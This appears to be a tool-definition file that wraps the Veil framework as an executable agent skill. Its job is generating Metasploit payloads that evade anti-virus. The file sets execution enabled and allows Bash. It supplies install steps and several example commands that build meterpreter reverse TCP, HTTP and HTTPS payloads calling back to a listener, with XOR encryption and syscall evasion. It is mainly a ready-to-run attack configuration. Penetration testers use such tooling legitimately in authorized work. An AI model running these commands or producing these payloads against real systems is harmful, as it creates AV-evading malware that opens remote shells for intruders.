---
id: security-exploit-veil
namespace: security:exploit:veil
name: veil
description: Veil framework for generating Metasploit-compatible payloads that bypass common anti-virus solutions.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - payload.generation
  - av.evasion
  - metasploit.integration
  - shellcode.encoding
platforms:
  - linux
  - macos
  - cross-platform
risk_level: high
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies:
  - python3
related_tools:
  - shellter
  - metasploit
  - msfvenom
workflow_edges:
  produces:
    - evasive-payload
    - payload-binary
  consumes:
    - payload-type
    - lhost
    - lport
    - evasion-technique
contract:
  inputs:
    - type: payload.type
      description: Type of payload to generate
    - type: network.lhost
      description: Listener IP for reverse connection
    - type: network.lport
      description: Listener port for reverse connection
    - type: evasion.technique
      description: AV evasion technique to apply
  outputs:
    - type: payload.binary
      description: Generated evasive payload
      mime: application/octet-stream
  side_effects:
    - filesystem_write
  resource_cost:
    cpu: medium
    memory_mb: 128
    network: low
    disk_io: medium
resource_profile:
  cpu: medium
  memory_mb: 128
  network: low
  disk_io: medium
allowed-tools:
  - veil
  - Bash
  - execFile
parameters:
  - name: tool
    type: string
    required: false
    description: "Tool/payload type (Evasion, Ordnance, etc.)"
    aliases:
      - -t
      - --tool
  - name: payload
    type: string
    required: false
    description: "Payload name to generate"
    aliases:
      - -p
      - --payload
  - name: flag-o
    type: string
    required: false
    description: "Output file path"
    aliases:
      - -o
      - --output
  - name: flag-l
    type: string
    required: false
    description: "Listener payload type"
    aliases:
      - -l
      - --listener
  - name: flag-ip
    type: string
    required: false
    description: "Listener IP address"
    aliases:
      - --ip
  - name: flag-port
    type: integer
    required: false
    description: "Listener port"
    aliases:
      - --port
  - name: flag-msfvenom
    type: boolean
    required: false
    description: "Use msfvenom for payload generation"
    aliases:
      - --msfvenom
  - name: flag-c
    type: string
    required: false
    description: "Config file path"
    aliases:
      - -c
      - --config
  - name: flag-v
    type: boolean
    required: false
    description: "Verbose output"
    aliases:
      - -v
      - --verbose
  - name: encrypt
    type: string
    required: false
    description: "Encryption method"
    aliases:
      - --encrypt
  - name: evasion
    type: string
    required: false
    description: "Evasion technique"
    aliases:
      - --evasion
execution:
  template: "veil -t {tool} -p {payload} --ip {lhost} --port {lport}"
  sandbox: execFile
  timeout_seconds: 300
  shell: false
global_vars:
  lhost: "10.0.0.1"
  lport: "4444"
  tool: "Evasion"
  payload: "cs/meterpreter/rev_https.py"
examples:
  - description: "Generate meterpreter reverse HTTPS payload"
    command: veil -t Evasion -p cs/meterpreter/rev_https.py --ip 10.0.0.1 --port 443
  - description: "Generate reverse TCP payload"
    command: veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 10.0.0.1 --port 4444
  - description: "Generate with output file"
    command: veil -t Evasion -p cs/meterpreter/rev_http.py --ip 10.0.0.1 --port 80 -o payload.exe
  - description: "Generate with specific evasion technique"
    command: veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 10.0.0.1 --port 4444 --evasion syscalls
  - description: "Use msfvenom base generation"
    command: veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 10.0.0.1 --port 4444 --msfvenom
  - description: "Verbose mode with encryption"
    command: veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 10.0.0.1 --port 4444 --encrypt xor -v
references:
  - label: "Veil GitHub"
    url: "https://github.com/Veil-Framework/Veil"
  - label: "Veil Documentation"
    url: "https://github.com/Veil-Framework/Veil/wiki"
phase: exploitation
techniques:
  - execution
  - execution
  - command-and-control
items:
  - NoCreds
  - Hash
services: []
attack_types:
  - Exploitation
install:
    - method: git
      repo_url: "https://github.com/Veil-Framework/Veil.git"
      commands:
        - "git clone https://github.com/Veil-Framework/Veil.git"
        - "cd Veil && ./setup/install.sh"
---
# Veil — Payload Generation Framework

Veil is a framework designed to generate Metasploit-compatible payloads that circumvent common anti-virus solutions. It uses various encoding, encryption, and obfuscation techniques to produce evasive executables.

## Key Features

- **AV Evasion**: Multiple techniques to bypass anti-virus detection
- **Metasploit compatible**: Generates payloads compatible with msfconsole
- **Multiple formats**: Python, C, C#, PowerShell, and more
- **Custom encoders**: XOR, AES, and other encryption methods
- **Ordnance**: Built-in shellcode generation tool
- **Cross-platform payloads**: Windows, Linux, and macOS targets
